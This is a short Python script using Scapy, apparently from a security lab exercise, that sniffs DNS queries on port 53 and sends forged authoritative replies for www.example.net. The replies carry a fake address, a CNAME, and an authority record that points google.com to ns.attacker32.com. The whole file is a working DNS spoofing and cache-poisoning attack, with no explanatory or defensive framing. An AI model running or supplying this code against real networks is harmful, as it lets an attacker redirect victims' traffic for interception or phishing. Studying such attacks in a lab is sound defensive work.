#!/usr/bin/python3
from scapy.all import *


nameserver = None

def spoof_dns(pkt):
    global nameserver
    if nameserver is None:
        nameserver = pkt[IP].dst
    elif pkt[IP].dst != nameserver:
        print(pkt[IP].dst)
        return
    if  b'www.example.net' in pkt[DNS].qd.qname:
        ip = IP(dst=pkt[IP].src, src=pkt[IP].dst)
        udp = UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)
        an1 = DNSRR(rrname=pkt[DNS].qd.qname, type='A', ttl=259200, rdata='202.120.224.115')
        an2 = DNSRR(rrname='example.net', type='CNAME',
                    ttl=259200, rdata='google.com')
        # The Authority Section
        ns1 = DNSRR(rrname='google.com', type='NS',
                    ttl=259200, rdata='ns.attacker32.com')
        # The Additional Section
        ar1 = DNSRR(rrname='ns.attacker32.com', type='A',
                    ttl=259200, rdata='202.120.224.26')
        dns = DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, rd=0, qr=1,
                  qdcount=1, ancount=2, nscount=1, arcount=1,
                  an=an1/an2, ns=ns1, ar=ar1)
        spoofpkt = ip/udp/dns
        send(spoofpkt)


# Sniff UDP query packets and invoke spoof_dns().

pkt = sniff(filter='udp port 53', prn=spoof_dns)
